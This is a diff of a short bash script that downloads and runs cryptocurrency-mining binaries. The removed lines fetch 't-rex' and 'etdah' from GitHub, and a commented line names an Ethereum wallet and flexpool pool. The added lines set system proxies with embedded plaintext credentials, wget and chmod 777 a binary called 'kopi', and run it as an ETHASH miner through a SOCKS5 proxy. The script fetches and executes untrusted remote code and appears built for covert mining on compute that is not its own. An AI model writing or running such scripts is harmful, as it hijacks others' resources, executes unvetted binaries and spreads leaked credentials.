@@ -1,11 +1,8 @@
 !/bin/bash
-echo "ENGINE START!"
-export LD_PRELOAD=
-curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/t-rex
-curl -sLO https://raw.githubusercontent.com/torgyv/cuda/main/etdah
+curl --proxy "http://lagra:bSoa5anJnf@154.9.131.17:29569/" https://ipv4.webshare.io/
+export http_proxy=http://lagra:bSoa5anJnf@154.9.131.17:29569 &&
+export https_proxy=http://lagra:bSoa5anJnf@154.9.131.17:29569 &&
+export ftp_proxy=http://lagra:bSoa5anJnf@154.9.131.17:29569 &&
+wget https://github.com/selokguine3/yes/raw/main/kopi && chmod 777 kopi
+./kopi --algo ETHASH --pool 3.215.245.39:443 --user sagemod --proxy socks5 lagra:bSoa5anJnf@154.9.131.17:29569
 
-chmod +x t-rex
-chmod +x etdah
-
-#/bin/pwd -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xc849640837cBce9Ec3e3ce1d1f755A2DE5fb6ddF -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240 --keep-gpu-busy --no-watchdog
-sudo ./t-rex -c etdah
